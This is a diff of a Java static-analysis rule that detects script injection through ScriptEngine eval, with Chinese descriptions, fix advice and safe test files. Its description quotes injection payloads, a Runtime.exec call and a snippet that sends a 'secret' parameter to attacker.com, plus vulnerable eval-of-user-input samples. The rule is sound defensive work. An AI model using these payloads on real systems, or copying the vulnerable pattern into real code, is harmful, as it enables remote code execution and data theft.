@@ -6,87 +6,81 @@ desc(
 ### 漏洞描述
 
 1. **漏洞原理**
-   动态代码执行（Dynamic Code Execution）是指在程序运行时解析并执行外部提供的代码片段。当应用程序允许用户或外部输入影响动态执行的代码内容时，如果缺少有效的输入验证、过滤或沙箱机制，攻击者可以注入恶意代码，使得应用程序在运行时执行攻击者指定的指令。在Java中，使用`javax.script.ScriptEngine`等接口执行JavaScript、Groovy、Python等脚本语言时，尤其容易受到脚本注入攻击。
+动态代码执行（Dynamic Code Execution）是指在程序运行时解析并执行外部提供的代码片段。当应用程序允许用户或外部输入影响动态执行的代码内容时，如果缺少有效的输入验证、过滤或沙箱机制，攻击者可以注入恶意代码，使得应用程序在运行时执行攻击者指定的指令。在Java中，使用`javax.script.ScriptEngine`等接口执行JavaScript、Groovy、Python等脚本语言时，尤其容易受到脚本注入攻击。
 
 2. **触发场景**
-   当应用程序直接将用户输入的字符串作为脚本代码传递给脚本引擎执行时，会触发脚本注入漏洞。例如，一个提供在线计算功能的Web应用，如果直接使用`scriptEngine.eval(userInput)`来执行用户提交的数学表达式，而用户输入是类似`1 + 1`这样的合法表达式，程序正常运行。但攻击者可以构造恶意输入，例如：
-
-   ```javascript
-   java.lang.Runtime.getRuntime().exec('calc.exe')
-   ```
-   
-   或者在Web场景下利用HttpServletRequest获取敏感信息：
-   
-   ```javascript
-   var req = new HttpServletRequest(); // 假设可以获取到Request对象
-   var sensitiveInfo = req.getParameter("secret");
-   // 将敏感信息发送到攻击者的服务器
-   new java.net.URL("http://attacker.com/?data=" + sensitiveInfo).openStream();
-   ```
-   
-   这些恶意代码会被脚本引擎执行，导致在服务器端任意代码执行（RCE）或其他安全威胁。以下是示例代码可能触发该漏洞的情况：
-
-   ```java
-   public Object executeOperation(HttpServletRequest request) {
-       // ...
-       String userOps = request.getParameter("operation"); // 用户输入
-       return scriptEngine.eval(userOps); // 直接执行用户输入
-   }
-   ```
-
-   ```java
-   public String executeScript(@RequestBody String userScript) {
-       // ...
-       try {
-           CompiledScript script = compilable.compile(userScript); // 直接编译用户输入
-           return "Script executed successfully: " + script.eval();
-       } catch (Exception e) {
-           return "Error executing script: " + e.getMessage();
-       }
-   }
-   ```
+当应用程序直接将用户输入的字符串作为脚本代码传递给脚本引擎执行时，会触发脚本注入漏洞。例如，一个提供在线计算功能的Web应用，如果直接使用`scriptEngine.eval(userInput)`来执行用户提交的数学表达式，而用户输入是类似`1 + 1`这样的合法表达式，程序正常运行。但攻击者可以构造恶意输入，例如：
+```javascript
+java.lang.Runtime.getRuntime().exec('calc.exe')
+```
+或者在Web场景下利用HttpServletRequest获取敏感信息：
+```javascript
+var req = new HttpServletRequest(); // 假设可以获取到Request对象
+var sensitiveInfo = req.getParameter("secret");
+// 将敏感信息发送到攻击者的服务器
+new java.net.URL("http://attacker.com/?data=" + sensitiveInfo).openStream();
+```
+这些恶意代码会被脚本引擎执行，导致在服务器端任意代码执行（RCE）或其他安全威胁。以下是示例代码可能触发该漏洞的情况：
+```java
+public Object executeOperation(HttpServletRequest request) {
+// ...
+String userOps = request.getParameter("operation"); // 用户输入
+return scriptEngine.eval(userOps); // 直接执行用户输入
+}
+```
+```java
+public String executeScript(@RequestBody String userScript) {
+// ...
+try {
+CompiledScript script = compilable.compile(userScript); // 直接编译用户输入
+return "Script executed successfully: " + script.eval();
+} catch (Exception e) {
+return "Error executing script: " + e.getMessage();
+}
+}
+```
 
 3. **潜在影响**
-   - **远程代码执行 (RCE)**：攻击者执行任意操作系统命令，完全控制受影响的服务器。
-   - **数据泄露**：访问和窃取数据库、文件系统或其他敏感数据。
-   - **拒绝服务 (DoS)**：执行恶意的脚本代码消耗大量系统资源或崩溃应用程序。
-   - **权限提升**：利用应用程序或服务器的权限执行特权操作。
-   - **内网渗透**：利用受感染的服务器作为跳板攻击内部网络资源。
+- **远程代码执行 (RCE)**：攻击者执行任意操作系统命令，完全控制受影响的服务器。
+- **数据泄露**：访问和窃取数据库、文件系统或其他敏感数据。
+- **拒绝服务 (DoS)**：执行恶意的脚本代码消耗大量系统资源或崩溃应用程序。
+- **权限提升**：利用应用程序或服务器的权限执行特权操作。
+- **内网渗透**：利用受感染的服务器作为跳板攻击内部网络资源。
+
 DESC
 	rule_id: "d45a6fba-7221-4750-8ad5-4566be060827"
 	solution: <<<SOLUTION
 ### 修复建议
 
 1. **避免动态执行不可信的代码**
-   尽可能不要直接在服务器端执行用户提供的代码。如果业务需求必须涉及动态执行，考虑使用更安全、更受限的方式，例如使用内置于语言的解释器，而不是允许执行任意脚本。
+尽可能不要直接在服务器端执行用户提供的代码。如果业务需求必须涉及动态执行，考虑使用更安全、更受限的方式，例如使用内置于语言的解释器，而不是允许执行任意脚本。
 
 2. **输入验证和过滤**
-   对用户输入进行严格的格式和内容验证。只允许符合预期的字符、表达式或语言结构。使用白名单机制拒绝所有不被明确允许的输入，而不是尝试过滤已知恶意字符。
-
-   ```java
-   // 示例：只允许简单的数学表达式和数字
-   String userOps = request.getParameter("operation");
-   if (!userOps.matches("^[0-9+\-*/()\s]+$")) { // 简单的正则过滤，不建议用于复杂场景
-       throw new IllegalArgumentException("Invalid operation");
-   }
-   scriptEngine.eval(userOps);
-   ```
-   **注意：严格、安全的输入过滤非常困难，容易被绕过，不作为首选方案。**
+对用户输入进行严格的格式和内容验证。只允许符合预期的字符、表达式或语言结构。使用白名单机制拒绝所有不被明确允许的输入，而不是尝试过滤已知恶意字符。
+```java
+// 示例：只允许简单的数学表达式和数字
+String userOps = request.getParameter("operation");
+if (!userOps.matches("^[0-9+\-*/()\s]+$")) { // 简单的正则过滤，不建议用于复杂场景
+throw new IllegalArgumentException("Invalid operation");
+}
+scriptEngine.eval(userOps);
+```
+**注意：严格、安全的输入过滤非常困难，容易被绕过，不作为首选方案。**
 
 3. **使用安全沙箱环境**
-   如果必须执行不可信的代码，考虑在隔离的、资源受限的沙箱环境中执行。例如，对于Java的`ScriptEngine`，可以尝试配置或寻找支持更严格沙箱策略的引擎实现（但标准库的沙箱能力有限）。或者考虑使用专门设计的沙箱技术，如Java的SecurityManager（配置复杂）或第三方隔离执行环境。
+如果必须执行不可信的代码，考虑在隔离的、资源受限的沙箱环境中执行。例如，对于Java的`ScriptEngine`，可以尝试配置或寻找支持更严格沙箱策略的引擎实现（但标准库的沙箱能力有限）。或者考虑使用专门设计的沙箱技术，如Java的SecurityManager（配置复杂）或第三方隔离执行环境。
 
 4. **使用特定功能的API代替脚本引擎**
-   如果只是需要执行计算或其他特定任务，优先考虑使用Java标准库或成熟的第三方库提供的专用API，这些API通常比通用脚本引擎更安全且功能受限。例如，对于数学计算，可以使用`BigDecimal`或表达式解析库。
+如果只是需要执行计算或其他特定任务，优先考虑使用Java标准库或成熟的第三方库提供的专用API，这些API通常比通用脚本引擎更安全且功能受限。例如，对于数学计算，可以使用`BigDecimal`或表达式解析库。
 
 5. **最小权限原则**
-   运行应用程序的用户或进程应遵循最小权限原则，即使发生注入，也能限制潜在损害范围。
+运行应用程序的用户或进程应遵循最小权限原则，即使发生注入，也能限制潜在损害范围。
+```java
+// 避免在eval的脚本中访问敏感的Java类或方法
+// 部分脚本引擎可能支持限制可访问的类，需要查阅具体引擎文档。
+// 例如 Rhino 引擎早期版本可以通过Context.setClassShutter() 进行限制，但用法复杂且不完全可靠。
+```
 
-   ```java
-   // 避免在eval的脚本中访问敏感的Java类或方法
-   // 部分脚本引擎可能支持限制可访问的类，需要查阅具体引擎文档。
-   // 例如 Rhino 引擎早期版本可以通过Context.setClassShutter() 进行限制，但用法复杂且不完全可靠。
-   ```
 SOLUTION
 	reference: <<<REFERENCE
 [CWE-94: Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)
@@ -105,10 +99,80 @@ INCLUDE,
 
 alert $mid for {
 	level: "mid",
-	message: "Find Java Dynamic Code Evaluation Script Injection Vulnerability",
-	risk: "rce-code",
+	message: "发现Java动态代码执行中的脚本注入漏洞，并且从数据源（source）到污染汇聚点（sink）间可能存在过滤函数，需进一步审计进行确认。",
+	risk: "远程代码执行",
 	title: "Detect Java Script Injection Vulnerability in Dynamic Code Execution",
 	title_zh: "检测Java动态代码执行中的脚本注入漏洞",
+	name: "mid",
+	solution: <<<SOLUTION
+### 修复建议
+1. **避免动态执行不可信的代码**
+尽可能不要直接在服务器端执行用户提供的代码。如果业务需求必须涉及动态执行，考虑使用更安全、更受限的方式，例如使用内置于语言的解释器，而不是允许执行任意脚本。
+2. **输入验证和过滤**
+对用户输入进行严格的格式和内容验证。只允许符合预期的字符、表达式或语言结构。使用白名单机制拒绝所有不被明确允许的输入，而不是尝试过滤已知恶意字符。
+```java
+// 示例：只允许简单的数学表达式和数字
+String userOps = request.getParameter("operation");
+if (!userOps.matches("^[0-9+\-*/()\s]+$")) { // 简单的正则过滤，不建议用于复杂场景
+throw new IllegalArgumentException("Invalid operation");
+}
+scriptEngine.eval(userOps);
+```
+**注意：严格、安全的输入过滤非常困难，容易被绕过，不作为首选方案。**
+3. **使用安全沙箱环境**
+如果必须执行不可信的代码，考虑在隔离的、资源受限的沙箱环境中执行。例如，对于Java的`ScriptEngine`，可以尝试配置或寻找支持更严格沙箱策略的引擎实现（但标准库的沙箱能力有限）。或者考虑使用专门设计的沙箱技术，如Java的SecurityManager（配置复杂）或第三方隔离执行环境。
+4. **使用特定功能的API代替脚本引擎**
+如果只是需要执行计算或其他特定任务，优先考虑使用Java标准库或成熟的第三方库提供的专用API，这些API通常比通用脚本引擎更安全且功能受限。例如，对于数学计算，可以使用`BigDecimal`或表达式解析库。
+5. **最小权限原则**
+运行应用程序的用户或进程应遵循最小权限原则，即使发生注入，也能限制潜在损害范围。
+```java
+// 避免在eval的脚本中访问敏感的Java类或方法
+// 部分脚本引擎可能支持限制可访问的类，需要查阅具体引擎文档。
+// 例如 Rhino 引擎早期版本可以通过Context.setClassShutter() 进行限制，但用法复杂且不完全可靠。
+```
+SOLUTION
+	desc: <<<DESC
+### 漏洞描述
+1. **漏洞原理**
+动态代码执行（Dynamic Code Execution）是指在程序运行时解析并执行外部提供的代码片段。当应用程序允许用户或外部输入影响动态执行的代码内容时，如果缺少有效的输入验证、过滤或沙箱机制，攻击者可以注入恶意代码，使得应用程序在运行时执行攻击者指定的指令。在Java中，使用`javax.script.ScriptEngine`等接口执行JavaScript、Groovy、Python等脚本语言时，尤其容易受到脚本注入攻击。
+2. **触发场景**
+当应用程序直接将用户输入的字符串作为脚本代码传递给脚本引擎执行时，会触发脚本注入漏洞。例如，一个提供在线计算功能的Web应用，如果直接使用`scriptEngine.eval(userInput)`来执行用户提交的数学表达式，而用户输入是类似`1 + 1`这样的合法表达式，程序正常运行。但攻击者可以构造恶意输入，例如：
+```javascript
+java.lang.Runtime.getRuntime().exec('calc.exe')
+```
+或者在Web场景下利用HttpServletRequest获取敏感信息：
+```javascript
+var req = new HttpServletRequest(); // 假设可以获取到Request对象
+var sensitiveInfo = req.getParameter("secret");
+// 将敏感信息发送到攻击者的服务器
+new java.net.URL("http://attacker.com/?data=" + sensitiveInfo).openStream();
+```
+这些恶意代码会被脚本引擎执行，导致在服务器端任意代码执行（RCE）或其他安全威胁。以下是示例代码可能触发该漏洞的情况：
+```java
+public Object executeOperation(HttpServletRequest request) {
+// ...
+String userOps = request.getParameter("operation"); // 用户输入
+return scriptEngine.eval(userOps); // 直接执行用户输入
+}
+```
+```java
+public String executeScript(@RequestBody String userScript) {
+// ...
+try {
+CompiledScript script = compilable.compile(userScript); // 直接编译用户输入
+return "Script executed successfully: " + script.eval();
+} catch (Exception e) {
+return "Error executing script: " + e.getMessage();
+}
+}
+```
+3. **潜在影响**
+- **远程代码执行 (RCE)**：攻击者执行任意操作系统命令，完全控制受影响的服务器。
+- **数据泄露**：访问和窃取数据库、文件系统或其他敏感数据。
+- **拒绝服务 (DoS)**：执行恶意的脚本代码消耗大量系统资源或崩溃应用程序。
+- **权限提升**：利用应用程序或服务器的权限执行特权操作。
+- **内网渗透**：利用受感染的服务器作为跳板攻击内部网络资源。
+DESC
 }
 
 desc(
@@ -129,6 +193,124 @@ desc(
         }
     }
 TEXT
+	"safefile://SafeMathCalculator.java": <<<CODE
+package org.example;
+
+public class SafeMathCalculator {
+
+    // 场景一：使用Java内置的API进行安全的数学计算，不涉及脚本引擎
+    // 此方法仅处理数字计算，不允许注入任何代码
+    public double calculateSum(double a, double b) {
+        return a + b;
+    }
+
+    // 场景二：处理固定、已知且安全的字符串，不接受用户输入作为执行代码
+    // 字符串内容是硬编码的，不可被外部篡改
+    public String getAppVersion() {
+        return "Application Version 1.0.0";
+    }
+
+    // 场景三：将用户输入作为数据，而非可执行代码，并进行严格的类型转换和验证
+    // 用户输入被视为普通的字符串数据，而非表达式，并转换为整数
+    public int processUserId(String userIdStr) {
+        try {
+            return Integer.parseInt(userIdStr);
+        } catch (NumberFormatException e) {
+            // 适当的错误处理，例如抛出异常或返回默认值
+            System.err.println("Invalid user ID format: " + userIdStr);
+            return -1;
+        }
+    }
+
+    // 场景四：如果必须处理表达式，使用专门的、安全的表达式解析库
+    // 例如，使用JEP (Java Expression Parser) 或 exp4j 等库，这些库通常更注重安全性
+    // 本示例仅为概念性说明，实际使用需要引入相应的库
+    /*
+    public double evaluateSecureExpression(String expression) {
+        // 假设这里使用了安全的表达式解析库，对输入进行严格校验
+        // ExpressionParser parser = new SafeExpressionParser();
+        // return parser.parse(expression);
+        return 0; // 占位符
+    }
+    */
+}
+CODE
+	"safefile://SecureScriptInvocation.java": <<<CODE
+package org.example;
+
+import javax.script.ScriptEngineManager;
+import javax.script.ScriptEngine;
+import javax.script.ScriptException;
+import java.io.Reader;
+import java.io.StringReader;
+
+public class SecureScriptInvocation {
+
+    private static final String SAFE_FUNCTION = "function add(a, b) { return a + b; }";
+
+    // 场景一：执行硬编码的、已知安全的脚本代码，不接受任何用户输入参与脚本内容
+    // 脚本内容是固定的，不可被用户控制
+    public int performSafeOperation(int val1, int val2) {
+        ScriptEngineManager manager = new ScriptEngineManager();
+        ScriptEngine engine = manager.getEngineByName("JavaScript");
+        try {
+            // 预加载安全的函数
+            engine.eval(SAFE_FUNCTION);
+            // 调用预加载的安全函数，并传入参数作为数据
+            Object result = engine.eval("add(" + val1 + ", " + val2 + ");");
+            if (result instanceof Number) {
+                return ((Number) result).intValue();
+            }
+        } catch (ScriptException e) {
+            e.printStackTrace();
+        }
+        return -1;
+    }
+
+    // 场景二：从受信任的资源（如文件系统中的固定路径或classpath）加载脚本，而非用户输入
+    // 确保脚本来源可信且不可被篡改
+    public String executeTrustedScript() {
+        ScriptEngineManager manager = new ScriptEngineManager();
+        ScriptEngine engine = manager.getEngineByName("JavaScript");
+        try (
+            // 假设'trusted_script.js'是一个位于classpath或固定安全位置的脚本文件
+            // 实际应用中应使用ClassLoader或FileInputStream安全加载
+            Reader reader = new StringReader("var date = new Date(); date.getFullYear();")
+        ) {
+            Object result = engine.eval(reader);
+            return "Current year: " + result;
+        } catch (ScriptException e) {
+            e.printStackTrace();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return "Error";
+    }
+
+    // 场景三：如果用户输入作为数据传入脚本，而非脚本本身，且脚本逻辑是硬编码的
+    public String greetUserSecurely(String userName) {
+        ScriptEngineManager manager = new ScriptEngineManager();
+        ScriptEngine engine = manager.getEngineByName("JavaScript");
+        try {
+            // 将用户输入作为参数绑定到脚本上下文中，而不是直接拼接进脚本代码
+            engine.put("username", userName);
+            Object result = engine.eval("" +
+                    "function safeGreet() { " +
+                    "  if (username && username.length > 0) { " +
+                    "    return 'Hello, ' + username + '!'; " +
+                    "  } else { " +
+                    "    return 'Hello, Guest!'; " +
+                    "  } " +
+                    "}; " +
+                    "safeGreet();");
+            return result.toString();
+        } catch (ScriptException e) {
+            e.printStackTrace();
+        }
+        return "Error";
+    }
+}
+CODE
 )
 
 desc(
@@ -162,4 +344,122 @@ desc(
         }
     }
 TEXT
+	"safefile://SafeMathCalculator.java": <<<CODE
+package org.example;
+
+public class SafeMathCalculator {
+
+    // 场景一：使用Java内置的API进行安全的数学计算，不涉及脚本引擎
+    // 此方法仅处理数字计算，不允许注入任何代码
+    public double calculateSum(double a, double b) {
+        return a + b;
+    }
+
+    // 场景二：处理固定、已知且安全的字符串，不接受用户输入作为执行代码
+    // 字符串内容是硬编码的，不可被外部篡改
+    public String getAppVersion() {
+        return "Application Version 1.0.0";
+    }
+
+    // 场景三：将用户输入作为数据，而非可执行代码，并进行严格的类型转换和验证
+    // 用户输入被视为普通的字符串数据，而非表达式，并转换为整数
+    public int processUserId(String userIdStr) {
+        try {
+            return Integer.parseInt(userIdStr);
+        } catch (NumberFormatException e) {
+            // 适当的错误处理，例如抛出异常或返回默认值
+            System.err.println("Invalid user ID format: " + userIdStr);
+            return -1;
+        }
+    }
+
+    // 场景四：如果必须处理表达式，使用专门的、安全的表达式解析库
+    // 例如，使用JEP (Java Expression Parser) 或 exp4j 等库，这些库通常更注重安全性
+    // 本示例仅为概念性说明，实际使用需要引入相应的库
+    /*
+    public double evaluateSecureExpression(String expression) {
+        // 假设这里使用了安全的表达式解析库，对输入进行严格校验
+        // ExpressionParser parser = new SafeExpressionParser();
+        // return parser.parse(expression);
+        return 0; // 占位符
+    }
+    */
+}
+CODE
+	"safefile://SecureScriptInvocation.java": <<<CODE
+package org.example;
+
+import javax.script.ScriptEngineManager;
+import javax.script.ScriptEngine;
+import javax.script.ScriptException;
+import java.io.Reader;
+import java.io.StringReader;
+
+public class SecureScriptInvocation {
+
+    private static final String SAFE_FUNCTION = "function add(a, b) { return a + b; }";
+
+    // 场景一：执行硬编码的、已知安全的脚本代码，不接受任何用户输入参与脚本内容
+    // 脚本内容是固定的，不可被用户控制
+    public int performSafeOperation(int val1, int val2) {
+        ScriptEngineManager manager = new ScriptEngineManager();
+        ScriptEngine engine = manager.getEngineByName("JavaScript");
+        try {
+            // 预加载安全的函数
+            engine.eval(SAFE_FUNCTION);
+            // 调用预加载的安全函数，并传入参数作为数据
+            Object result = engine.eval("add(" + val1 + ", " + val2 + ");");
+            if (result instanceof Number) {
+                return ((Number) result).intValue();
+            }
+        } catch (ScriptException e) {
+            e.printStackTrace();
+        }
+        return -1;
+    }
+
+    // 场景二：从受信任的资源（如文件系统中的固定路径或classpath）加载脚本，而非用户输入
+    // 确保脚本来源可信且不可被篡改
+    public String executeTrustedScript() {
+        ScriptEngineManager manager = new ScriptEngineManager();
+        ScriptEngine engine = manager.getEngineByName("JavaScript");
+        try (
+            // 假设'trusted_script.js'是一个位于classpath或固定安全位置的脚本文件
+            // 实际应用中应使用ClassLoader或FileInputStream安全加载
+            Reader reader = new StringReader("var date = new Date(); date.getFullYear();")
+        ) {
+            Object result = engine.eval(reader);
+            return "Current year: " + result;
+        } catch (ScriptException e) {
+            e.printStackTrace();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return "Error";
+    }
+
+    // 场景三：如果用户输入作为数据传入脚本，而非脚本本身，且脚本逻辑是硬编码的
+    public String greetUserSecurely(String userName) {
+        ScriptEngineManager manager = new ScriptEngineManager();
+        ScriptEngine engine = manager.getEngineByName("JavaScript");
+        try {
+            // 将用户输入作为参数绑定到脚本上下文中，而不是直接拼接进脚本代码
+            engine.put("username", userName);
+            Object result = engine.eval("" +
+                    "function safeGreet() { " +
+                    "  if (username && username.length > 0) { " +
+                    "    return 'Hello, ' + username + '!'; " +
+                    "  } else { " +
+                    "    return 'Hello, Guest!'; " +
+                    "  } " +
+                    "}; " +
+                    "safeGreet();");
+            return result.toString();
+        } catch (ScriptException e) {
+            e.printStackTrace();
+        }
+        return "Error";
+    }
+}
+CODE
 )
